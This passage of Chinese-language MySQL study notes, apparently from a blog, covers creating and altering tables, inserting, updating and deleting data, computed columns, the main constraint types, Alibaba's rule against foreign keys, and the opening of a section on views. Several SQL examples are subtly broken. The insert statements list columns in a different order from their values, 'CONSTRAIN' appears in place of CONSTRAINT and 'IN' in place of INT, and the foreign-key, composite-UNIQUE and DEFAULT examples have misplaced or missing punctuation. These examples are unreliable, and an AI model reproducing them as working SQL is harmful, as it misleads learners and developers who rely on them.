<li>常用建表方法(使用数据库的字符集)：<br><code>CREATE TABLE IF NOT EXISTS table_name( column_name INT, column_name1 VARCHAR(2)...);</code><br>同时可以指定表的字符集，只需要在末尾添加<code>character set &#39;utf8&#39;</code><br>也可以指定字段的字符集，只需要在字段类型后添加<code>character set &#39;utf8&#39;</code><br>同时可以指定表的存储引擎，在character前添加<code>engine=innod</code></li>
<li>基于现有表创建并导入相应数据：<br><code>CREATE TABLE table_name AS SELECT ... FROM ...;</code></li>
<li>删除：<code>drop table if exists table_name;</code></li>
</ol>
<p>表的管理</p>
<ol>
<li>查看表结构: <code>desc table_name;</code></li>
<li>查看创建表的语句：<code>show create table table_name;</code></li>
</ol>
<p>表的修改 alter table</p>
<ol>
<li>添加字段：<ul>
<li>添加到最后一列：<code>alter table table_name add column_name double(10,2);</code> 10位整数2位小数</li>
<li>添加到第一列：<code>alter table table_name add column_name varchar(20) first;</code> </li>
<li>添加到指定位置：<code>alter table table_name add column_name char(10) after column_name_in_table;</code></li>
</ul>
</li>
<li>修改字段：可以修改数据类型，长度、默认值、位置<ul>
<li>修改数据类型：<code>alter table table_name modify column_name char(20);</code></li>
<li>修改默认值： <code>alter table table_name modify column_name char(20) default &#39;aa&#39;;</code></li>
<li>修改位置：<code>ALTER TABLE employees MODIFY mobile VARCHAR(20) AFTER code</code></li>
</ul>
</li>
<li>重命名字段：同时可以修改<br><code>alter table table_name change column_origin_name column_new_name char(20);</code></li>
<li>删除字段：<code>alter table table_name drop column column_name</code></li>
</ol>
<p>表的重命名：</p>
<ol>
<li><code>rename table table_origin_name to table_new_name;</code></li>
<li><code>alter table table_origin_name rename to table_new_name;</code></li>
</ol>
<p>清空表的数据truncate(表的结构保留)(建议使用<code>delete from</code>!)</p>
<ol>
<li><code>truncate table table_name</code></li>
<li>建议：<code>delete from</code></li>
</ol>
<p><strong>truncate table 和 delete from</strong></p>
<ol>
<li>都可以实现对所有数据的删除并保留表结构</li>
<li>不同：<ul>
<li><code>truncate table</code>:一旦执行，数据全部删除且不可回滚</li>
<li><code>delete from</code>:一旦执行，数据可以全部删除，可以设置为能回滚</li>
</ul>
</li>
</ol>
<h2 id="DML-数据的增删改"><a href="#DML-数据的增删改" class="headerlink" title="DML-数据的增删改"></a>DML-数据的增删改</h2><p>DML操作默认情况下，执行以后会自动提交数据</p>
<h3 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h3><p>方式一、逐条数据添加</p>
<ol>
<li>（最推荐）一次添加多条数据，同时指明添加的字段。<strong>未指明字段默认为NULL</strong>(无not null约束时)<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> emp1(id,birth,salary,`name`) <span class="keyword">values</span></span><br><span class="line">(<span class="number">1</span>,<span class="string">&#x27;shea&#x27;</span>,<span class="string">&#x27;2003-06-02&#x27;</span>,<span class="number">18000</span>),</span><br><span class="line">(<span class="number">1</span>,<span class="string">&#x27;Freya&#x27;</span>,<span class="string">&#x27;2001-10-24&#x27;</span>,<span class="number">13000</span>);</span><br></pre></td></tr></table></figure></li>
<li>（推荐）指明添加的字段，无序按照表中声明顺序。<strong>未指明字段默认为NULL</strong>(无not null约束时)<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> emp1(id,birth,salary,`name`) <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;shea&#x27;</span>,<span class="string">&#x27;2003-06-02&#x27;</span>,<span class="number">18000</span>);</span><br></pre></td></tr></table></figure></li>
<li>不指明添加的字段，必须严格按照表中字段声明顺序书写：<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> emp1 <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;shea&#x27;</span>,<span class="string">&#x27;2003-06-02&#x27;</span>,<span class="number">18000</span>);</span><br></pre></td></tr></table></figure></li>
</ol>
<p>方式二、将查询的结果插入表中<br>注意：</p>
<ol>
<li>查询的字段必须与要添加到的表的字段一一对应</li>
<li>要添加到的表中的字段长度必须不小于查询的字段的长度，否则可能添加失败</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> emp(id,`name`,salary) <span class="keyword">select</span> employee_id,last_name,salary <span class="keyword">from</span> employees <span class="keyword">where</span> department_id <span class="operator">=</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure>


<h3 id="更新和删除数据"><a href="#更新和删除数据" class="headerlink" title="更新和删除数据"></a>更新和删除数据</h3><p><strong>更新数据</strong><br>可以实现批量修改数据<br>修改数据可能因为约束导致修改失败<br><code>update ... set ... where...</code><br>示例：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> emp2 <span class="keyword">set</span> hire_date <span class="operator">=</span> curdate() <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">update</span> emp2 <span class="keyword">set</span> hire_date <span class="operator">=</span> curdate(),salary <span class="operator">=</span> <span class="number">14000</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p><strong>删除数据</strong><br>删除数据可能因为约束导致删除失败<br><code>delete from ... where ...</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> emp2 <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<h3 id="计算列"><a href="#计算列" class="headerlink" title="计算列"></a>计算列</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test1(</span><br><span class="line">   a <span class="type">INT</span>,</span><br><span class="line">   b <span class="type">INT</span>,</span><br><span class="line">   C <span class="type">INT</span> GENERATED ALWAYS <span class="keyword">AS</span> (a<span class="operator">+</span>b) VIRTUAL <span class="comment">-- 计算列，修改a,b自动更新</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>


<h2 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h2><p>数据完整性（Data Integrity）是指数据的精确性（Accuracy）和可靠性（Reliability）。它是防止数据库中<br>存在不符合语义规定的数据和防止因错误信息的输入输出造成无效操作或错误信息而提出的。为了保证数据的完整性，SQL规范以约束的方式对表数据进行额外的条件限制。从以下四个方面考虑：</p>
<ol>
<li>实体完整性（Entity Integrity）：例如，同一个表中，不能存在两条完全相同无法区分的记录</li>
<li>域完整性（Domain Integrity）：例如：年龄范围0-120，性别范围“男&#x2F;女”</li>
<li>引用完整性（Referential Integrity）：例如：员工所在部门，在部门表中要能找到这个部门</li>
<li>用户自定义完整性（User-defined Integrity）：例如：用户名唯一、密码不能为空等，本部门经理的工资不得高于本部门职工的平均工资的5倍</li>
</ol>
<p>约束是表级的强制规定。</p>
<p><strong>约束的分类</strong></p>
<ol>
<li>根据约束数据列的限制，约束可分为：<ul>
<li>单列约束：每个约束只约束一列</li>
<li>多列约束：每个约束可约束多列数据</li>
</ul>
</li>
<li>根据约束的作用范围，约束可分为：<ul>
<li>列级约束：只能作用在一个列上，跟在列的定义后面</li>
<li>表级约束：可以作用在多个列上，不与列一起，而是单独定义</li>
</ul>
</li>
<li>根据约束起的作用，约束可分为：<ul>
<li>NOT NULL 非空约束，规定某个字段不能为空</li>
<li>UNIQUE 唯一约束，规定某个字段在整个表中是唯一的</li>
<li>PRIMARY KEY 主键(非空且唯一)约束</li>
<li>FOREIGN KEY 外键约束</li>
<li>CHECK 检查约束(MySQL8.0前不支持，可以使用但无效果)</li>
<li>DEFAULT 默认值约束</li>
</ul>
</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建约束</span></span><br><span class="line"><span class="comment">-- 可以在创建表时规定约束（通过 CREATE TABLE 语句），或者在表创建之后通过 ALTER TABLE 语句规定约束</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看表拥有的约束</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.table_constraints <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;表名称&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="非空约束-NOT-NULL"><a href="#非空约束-NOT-NULL" class="headerlink" title="非空约束 NOT NULL"></a>非空约束 NOT NULL</h3><p>默认情况下，所有的类型的值都可以是NULL，包括INT、FLOAT等数据类型，使用<code>NOT NULL</code>限定某个字段&#x2F;某列的值不允许为空.</p>
<p><strong>特点</strong></p>
<ol>
<li>非空约束只能出现在表对象的列上，只能某个列单独限定非空，不能组合非空</li>
<li>一个表可以有很多列都分别限定了非空</li>
<li>空字符串’’不等于NULL，0也不等于NULL</li>
</ol>
<p><strong>添加非空约束</strong>注意是否存在默认值约束，参见默认值约束章节</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建表时添加</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test1(id <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> ,last_name <span class="type">varchar</span>(<span class="number">15</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,email <span class="type">varChar</span>(<span class="number">15</span>));</span><br><span class="line"><span class="comment">-- 修改时添加 当字段中含有NULL值时必须先修改值为非NULL,否则失败</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test1 MODIFY email <span class="type">VARCHAR</span>(<span class="number">15</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure>

<h3 id="唯一性约束-UNIQUE"><a href="#唯一性约束-UNIQUE" class="headerlink" title="唯一性约束 UNIQUE"></a>唯一性约束 UNIQUE</h3><p>用来限制某个字段&#x2F;某列的值不能重复。</p>
<p><strong>特点</strong></p>
<ol>
<li>同一个表可以有多个唯一约束。</li>
<li>唯一约束可以是某一个列的值唯一，也可以多个列组合的值唯一。</li>
<li>唯一性约束<strong>允许列值为空</strong>，且可以有多个为空</li>
<li>在创建唯一约束的时候，如果不给唯一约束命名，就默认和列名相同，组合列默认和第一列名字相同。</li>
<li>MySQL会给唯一约束的列上默认创建一个唯一索引。</li>
</ol>
<p><strong>添加唯一性约束</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建表时添加</span></span><br><span class="line"><span class="comment">-- 列级约束</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test1(id <span class="type">INT</span> <span class="keyword">UNIQUE</span>,last_name <span class="type">varchar</span>(<span class="number">15</span>),email <span class="type">varChar</span>(<span class="number">15</span>) <span class="keyword">UNIQUE</span>);</span><br><span class="line"><span class="comment">-- 表级约束 </span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test2(id <span class="type">INT</span>,email <span class="type">VARCHAR</span>(<span class="number">15</span>), <span class="keyword">CONSTRAINT</span> constraint_name <span class="keyword">UNIQUE</span>(email));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改时添加 当字段中含有相同值时必须先修改值,否则失败</span></span><br><span class="line"><span class="comment">-- 方法1</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test1 MODIFY email <span class="type">VARCHAR</span>(<span class="number">15</span>) <span class="keyword">UNIQUE</span>;</span><br><span class="line"><span class="comment">-- 方法2</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test1 <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> constraint_name <span class="keyword">UNIQUE</span>(email);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 复合型约束（多列约束）各约束列都一样才不能添加</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test3(id <span class="type">INT</span>,last_name <span class="type">varchar</span>(<span class="number">15</span>),`password` <span class="type">varChar</span>(<span class="number">25</span>) <span class="keyword">CONSTRAINT</span> constraint_name <span class="keyword">UNIQUE</span>(last_name,`password`));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除唯一性约束 通过删除唯一性索引（其名称与约束名称相同）</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test1 <span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> constraint_name;</span><br></pre></td></tr></table></figure>

<h3 id="主键约束-PRIMARY-KEY"><a href="#主键约束-PRIMARY-KEY" class="headerlink" title="主键约束 PRIMARY KEY"></a>主键约束 PRIMARY KEY</h3><p>非空且唯一，用来唯一标识表中的一行记录。</p>
<p><strong>特点</strong></p>
<ul>
<li>主键约束相当于唯一约束+非空约束的组合，主键约束列不允许重复，也不允许出现空值。</li>
<li>一个表最多<strong>只能有一个</strong>主键约束，建立主键约束可以在列级别创建，也可以在表级别上创建。</li>
<li>主键约束对应着表中的一列或者多列（复合主键）</li>
<li>如果是多列组合的复合主键约束，那么这些列都不允许为空值，并且组合的值不允许重复。</li>
<li>MySQL的主键名总是PRIMARY，就算自己命名了主键约束名也没用。</li>
<li>当创建主键约束时，系统默认会在所在的列或列组合上建立对应的主键索引（能够根据主键查询的，就根据主键查询，效率更高）。如果删除主键约束了，主键约束对应的索引就自动删除了。</li>
<li>需要注意的一点是，不要修改主键字段的值。因为主键是数据记录的唯一标识，如果修改了主键的值，就有可能会破坏数据的完整性。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建表时添加主键约束</span></span><br><span class="line"><span class="comment">-- 列级约束</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test(id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,`name` <span class="type">VARCHAR</span>(<span class="number">10</span>));</span><br><span class="line"><span class="comment">-- 表级约束-重命名无作用，名字仍是PRIMARY，没必要命名</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test1(id <span class="type">INT</span>,`name` <span class="type">VARCHAR</span>(<span class="number">10</span>),CONSTRAIN constrain_name <span class="keyword">PRIMARY</span> KEY(id));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改时添加主键约束 被约束列数据必须非空且唯一</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> test <span class="keyword">ADD</span> <span class="keyword">PRIMARY</span> KEY(id);</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> emp5 <span class="keyword">ADD</span> <span class="keyword">PRIMARY</span> KEY(`NAME`,pwd);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 复合主键约束 各约束列都一样或有某一列为空才不能添加</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test1(id <span class="type">INT</span>,`name` <span class="type">VARCHAR</span>(<span class="number">10</span>),CONSTRAIN constrain_name <span class="keyword">PRIMARY</span> KEY(id,`name`));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除 删除主键约束，不需要指定主键名，因为一个表只有一个主键，删除主键约束后，非空还存</span></span><br><span class="line">在。 </span><br><span class="line"><span class="comment">-- !!实际开发中完全不会进行此操作</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> test <span class="keyword">DROP</span> <span class="keyword">PRIMARY</span> KEY;</span><br></pre></td></tr></table></figure>

<h3 id="自增列-AUTO-INCREMENT"><a href="#自增列-AUTO-INCREMENT" class="headerlink" title="自增列 AUTO_INCREMENT"></a>自增列 AUTO_INCREMENT</h3><p>某个字段的值自增,此字段必须已经是<code>UNIQUE</code> 或 <code>PRIMARY KEY</code><br>开发中一旦向主键作用字段添加自增列声明，在添加数据时就不要添加此列数据了</p>
<p><strong>特点(重要)</strong></p>
<ol>
<li>一个表最多只能有一个自增长列</li>
<li>自增列声明必须紧跟在字段后，不能使用表级约束</li>
<li>当需要产生唯一标识符或顺序值时，可设置自增长</li>
<li>自增长列约束的列必须是键列（主键列，唯一键列）</li>
<li>自增约束的列的数据类型必须是整数类型</li>
<li>如果自增列指定了 0 和 null，会在当前最大值的基础上自增；如果自增列手动指定了具体值，直接赋值为具体值。</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建表时添加，必须是字段有主键约束或唯一性约束</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> test(id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY AUTO_INCREMENT,`name` <span class="type">VARCHAR</span>(<span class="number">10</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 修改时添加，必须是字段有主键约束或唯一性约束</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> test MODIFY id <span class="type">INT</span> AUTO_INCREMENT;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> test MODIFY id <span class="type">INT</span>;</span><br></pre></td></tr></table></figure>


<p>MySQL 8.0新特性—自增变量的持久化<br>在MySQL 8.0之前，自增主键AUTO_INCREMENT的值如果大于max(primary key)+1，在MySQL重启后，会重置AUTO_INCREMENT&#x3D;max(primary key)+1，这种现象在某些情况下会导致业务主键冲突或者其他难以发现的问题。<br>在MySQL 5.7系统中，对于自增主键的分配规则，是由InnoDB数据字典内部一个 计数器 来决定的，而该计数器只在 内存中维护 ，并不会持久化到磁盘中。当数据库重启时，该计数器会被初始化。<br>MySQL 8.0将自增主键的计数器持久化到 重做日志 中。每次计数器发生改变，都会将其写入重做日志中。如果数据库重启，InnoDB会根据重做日志中的信息来初始化计数器的内存值</p>
<h3 id="外键约束-FOREIGN-KEY"><a href="#外键约束-FOREIGN-KEY" class="headerlink" title="外键约束 FOREIGN KEY"></a>外键约束 FOREIGN KEY</h3><p>阿里规范 –&gt; 不得使用外键与级联</p>
<p><strong>限定某个表的某个字段的引用完整性.</strong></p>
<ol>
<li>主表的修改和删除数据受约束，不能删除和修改被从表引用的数据</li>
<li>从表的添加和修改数据受约束，不能添加主表引用列没有的数据</li>
<li>在从表上建立外键，要求主表必须存在</li>
<li>删除主表时，要求从表从表先删除，或将从表中外键引用该主表的关系先删除</li>
</ol>
<p><strong>主表被引用列被参考数据不可进行删改操作，从表不可添加主表中被引用列没有的数据</strong><br>主表（父表）：被引用的表，被参考的表<br>从表（子表）：引用别人的表，参考别人的表</p>
<p><strong>特点</strong></p>
<ol>
<li>从表的外键列，必须引用&#x2F;参考主表的主键或唯一约束的列. 为什么？因为被依赖&#x2F;被参考的值必须是唯一的</li>
<li>在创建外键约束时，如果不给外键约束命名，<strong>默认名不是列名，而是自动产生一个外键名</strong>（例如student_ibfk_1;），也可以指定外键约束名。</li>
<li>创建(CREATE)表时就指定外键约束的话，先创建主表，再创建从表</li>
<li>删表时，先删从表（或先删除外键约束），再删除主表</li>
<li>当主表的记录被从表参照时，主表的记录将不允许删除，如果要删除数据，需要先删除从表中依赖该记录的数据，然后才可以删除主表的数据</li>
<li>在“从表”中指定外键约束，并且一个表可以建立多个外键约束</li>
<li>从表的外键列与主表被参照的列名字可以不相同，但是数据类型必须一样，逻辑意义一致。如果类型不一样，创建子表时，就会出现错误“ERROR 1005 (HY000): Can’t createtable’database.tablename’(errno: 150)”。例如：都是表示部门编号，都是int类型。</li>
<li>当创建外键约束时，系统默认会在所在的列上建立对应的普通索引。但是索引名是外键的约束名。（根据外键查询效率很高）</li>
<li>删除外键约束后，必须手动删除对应的索引</li>
</ol>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建外键约束必须先创建主表</span></span><br><span class="line"><span class="comment">/*主表*/</span><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> departments(d_id <span class="type">INT</span> <span class="keyword">PRIMARY</span> KEY,d_name <span class="type">VARCHAR</span>(<span class="number">15</span>));</span><br><span class="line"><span class="comment">/*从表*/</span><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> employees(e_id <span class="keyword">IN</span> <span class="keyword">PRIMARY</span> KEY AUTO_INCREMENT,e_name <span class="type">VARCHAR</span>(<span class="number">15</span>),e_d_id <span class="type">INT</span></span><br><span class="line"><span class="comment">/*外键约束*/</span><span class="keyword">CONSTRAINT</span> con_emp_dep_d_id <span class="keyword">FOREIGN</span> KEY (e_d_id) <span class="keyword">REFERENCES</span> departments(d_id);</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 也可在修改表时添加，修改从表</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> employees <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> con_emp_dep_d_id <span class="keyword">FOREIGN</span> KEY (e_d_id) <span class="keyword">REFERENCES</span> departments(d_id);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="comment">-- 第一步先查看约束名和删除外键约束</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.table_constraints <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;表名称&#x27;</span>;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 从表名 <span class="keyword">DROP</span> <span class="keyword">FOREIGN</span> KEY 外键约束名;</span><br><span class="line"><span class="comment">-- 第二步查看索引名和删除索引。（注意，只能手动删除）</span></span><br><span class="line"><span class="keyword">SHOW</span> INDEX <span class="keyword">FROM</span> 表名称;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 从表名 <span class="keyword">DROP</span> INDEX 索引名;</span><br></pre></td></tr></table></figure>

<p><strong>约束等级</strong></p>
<ol>
<li><code>Cascade</code>：在父表上update&#x2F;delete记录时，同步update&#x2F;delete掉子表的匹配记录</li>
<li><code>Set null</code>：在父表上update&#x2F;delete记录时，将子表上匹配记录的列设为null，但是要注意子表的外键列不能为not null</li>
<li><code>No action</code>：如果子表中有匹配的记录，则不允许对父表对应候选键进行update&#x2F;delete操作</li>
<li><code>Restrict</code>：同no action， 都是立即检查外键约束</li>
<li><code>Set default</code>（在可视化工具SQLyog中可能显示空白）：父表有变更时，子表将外键列设置成一个默认的值，但Innodb不能识别<br>如果没有指定等级，就相当于Restrict方式。<br>对于外键约束，最好是采用:<code>ON UPDATE CASCADE ON DELETE RESTRICT</code>的方式。<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp(</span><br><span class="line">eid <span class="type">int</span> <span class="keyword">primary</span> key, </span><br><span class="line">ename <span class="type">varchar</span>(<span class="number">5</span>),</span><br><span class="line">deptid <span class="type">int</span>, </span><br><span class="line"><span class="keyword">foreign</span> key (deptid) <span class="keyword">references</span> dept(did) <span class="keyword">on</span> <span class="keyword">update</span> cascade <span class="keyword">on</span> <span class="keyword">delete</span> restrict</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="开发建议"><a href="#开发建议" class="headerlink" title="开发建议"></a>开发建议</h4><p>问题1：如果两个表之间有关系（一对一、一对多），比如：员工表和部门表（一对多），它们之间是否<br>一定要建外键约束？<br>答：不是的</p>
<p>问题2：建和不建外键约束有什么区别？<br>答：建外键约束，你的操作（创建表、删除表、添加、修改、删除）会受到限制，从语法层面受到限制。例如：在员工表中不可能添加一个员工信息，它的部门的值在部门表中找不到。不建外键约束，你的操作（创建表、删除表、添加、修改、删除）不受限制，要保证数据的 引用完整性 ，只能依<code>靠程序员的自觉</code>，或者是<code>在Java程序中进行限定</code>。例如：在员工表中，可以添加一个员工的信息，它的部门指定为一个完全不存在的部门。</p>
<p>问题3：那么建和不建外键约束和查询有没有关系？<br>答：没有</p>
<p>在<code>MySQL</code>里，外键约束是<code>有成本</code>的，需要<code>消耗系统资源</code>。对于<code>大并发的 SQL 操作</code>，有可能会<code>不适合</code>。比如大型网站的中央数据库，可能会 因为外键约束的系统开销而变得非常慢 。所以， MySQL 允许你不使用系统自带的外键约束，在 应用层面 完成检查数据一致性的逻辑。也就是说，即使你不用外键约束，也要想办法通过应用层面的附加逻辑，来实现外键约束的功能，确保数据的一致性。</p>
<p><strong>阿里开发规范</strong><br>【强制】<strong>不得使用外键与级联</strong>，一切外键概念必须在应用层解决。</p>
<blockquote>
<p>说明：（概念解释）学生表中的 student_id 是主键，那么成绩表中的 student_id 则为外键。如果更新学生表中的 student_id，同时触发成绩表中的 student_id 更新，即为级联更新。外键与级联更新适用于 单机低并发 ，不适合 分布式 、高并发集群；级联更新是强阻塞，存在数据库 更新风暴 的风险；外键影响数据库的 插入速度 。</p>
</blockquote>
<h3 id="检查约束-CHECK"><a href="#检查约束-CHECK" class="headerlink" title="检查约束 CHECK"></a>检查约束 CHECK</h3><p>检查某个字段的值是否符号xx要求，一般指的是值的范围（MySQL5.7不支持，MySQL8.0支持）</p>
<p>示例</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 只能列级约束</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> employee(</span><br><span class="line">eid <span class="type">int</span> <span class="keyword">primary</span> key,</span><br><span class="line">ename <span class="type">varchar</span>(<span class="number">5</span>),</span><br><span class="line">age <span class="type">int</span> <span class="keyword">check</span> (age<span class="operator">&gt;</span><span class="number">18</span>),</span><br><span class="line">gender <span class="type">char</span> <span class="keyword">check</span> (gender <span class="keyword">in</span> (<span class="string">&#x27;男&#x27;</span>,<span class="string">&#x27;女&#x27;</span>))</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="默认值约束-DEFAULT"><a href="#默认值约束-DEFAULT" class="headerlink" title="默认值约束 DEFAULT"></a>默认值约束 DEFAULT</h3><p>给某个字段&#x2F;某列指定默认值，一旦设置默认值，在插入数据时，如果此字段没有显式赋值，则赋值为默认值。<br>但<strong>默认值约束一般不在唯一键和主键列上加</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 建表时添加默认值约束</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> 表名称(</span><br><span class="line">字段名 数据类型 <span class="keyword">primary</span> key,</span><br><span class="line">字段名 数据类型 <span class="keyword">unique</span> key <span class="keyword">not</span> <span class="keyword">null</span>,</span><br><span class="line">字段名 数据类型 <span class="keyword">unique</span> key,</span><br><span class="line">字段名 数据类型 <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">default</span> 默认值,</span><br><span class="line">);</span><br><span class="line"><span class="comment">-- 修改时添加</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名称 modify 字段名 数据类型 <span class="keyword">default</span> 默认值;</span><br><span class="line"><span class="comment">--如果这个字段原来有非空约束，你还保留非空约束，那么在加默认值约束时，还得保留非空约束，否则非空约束就被删除了</span></span><br><span class="line"><span class="comment">--同理，在给某个字段加非空约束也一样，如果这个字段原来有默认值约束，你想保留，也要在modify语句中保留默认值约束，否则就删除了</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名称 modify 字段名 数据类型 <span class="keyword">default</span> 默认值 <span class="keyword">not</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名称 modify 字段名 数据类型 ;#删除默认值约束，也不保留非空约束</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名称 modify 字段名 数据类型 <span class="keyword">not</span> <span class="keyword">null</span>; #删除默认值约束，保留非空约束</span><br></pre></td></tr></table></figure>

<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ol>
<li>为什么建表时，加 not null default ‘’ 或 default 0<br>答：不想让表中出现null值。</li>
<li>为什么不想要 null 的值<ol>
<li>不好比较。null是一种特殊值，比较时只能用专门的is null 和 is not null来比较。碰到运算符，通常返回null。</li>
<li>效率不高。影响提高索引效果。因此，我们往往在建表时 not null default ‘’ 或 default 0</li>
</ol>
</li>
<li>带AUTO_INCREMENT约束的字段值是从1开始的吗？<br>在MySQL中，默认AUTO_INCREMENT的初始值是1，每新增一条记录，字段值自动加1。设置自增属性（AUTO_INCREMENT）的时候，还可以指定第一条插入记录的自增字段的值，这样新插入的记录的自增字段值从初始值开始递增，如在表中插入第一条记录，同时指定id值为5，则以后插入的记录的id值就会从6开始往上增加。添加主键约束时，往往需要设置字段自动增加属性。</li>
<li>并不是每个表都可以任意选择存储引擎？<br>外键约束（FOREIGN KEY）不能跨引擎使用。<br>MySQL支持多种存储引擎，每一个表都可以指定一个不同的存储引擎，需要注意的是：外键约束是用来保证数据的参照完整性的，如果表之间需要关联外键，却指定了不同的存储引擎，那么这些表之间是不能创建外键约束的。所以说，存储引擎的选择也不完全是随意的</li>
</ol>
<h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><p><strong>视图</strong></p>
<ul>
<li>视图是一种<code>虚拟表</code>，本身是<code>不具有数据</code>的，占用很少的内存空间，它是<code>SQL</code>中的一个重要概念。实际每次都查看视图都会执行视图创建语句</li>
<li>视图建立在已有表的基础上,视图赖以建立的这些表称为基表。</li>
<li>视图的创建和删除只影响视图本身，不影响对应的基表。但是当对视图中的数据进行增加、删除和修改操作时，数据表中的数据会相应地发生变化，反之亦然。</li>
<li>向视图提供数据内容的语句为<code>SELECT</code>语句, 可以将视图理解为存储起来的<code>SELECT</code>语句</li>
<li>在数据库中，视图不会保存数据，数据真正保存在数据表中。</li>
